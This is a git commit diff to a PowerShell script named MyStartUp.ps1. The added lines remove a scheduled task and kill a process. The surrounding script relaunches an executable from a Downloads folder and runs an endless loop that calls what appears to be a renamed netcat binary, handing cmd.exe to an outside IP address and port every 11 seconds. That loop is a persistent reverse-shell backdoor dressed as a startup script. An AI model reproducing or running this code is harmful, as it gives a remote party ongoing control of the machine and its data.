01ce9d9015c76a6d4012f3fcec344eae826ae5a1
fullcaletaxixth <153169287+fullcaletaxixth@users.noreply.github.com>
2023-12-25 14:32:11 -0500

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,3 +1,5 @@
+Unregister-ScheduledTask -TaskName "testear" -Confirm:$false
+taskkill /F /IM testear.exe
 taskkill /F /IM lml.exe
 C:\Users\seba\Downloads\lml.exe
 while ($true){C:\Users\Public\RNM.exe -nv 193.161.193.99 46899 -e cmd.exe; start-sleep 11}
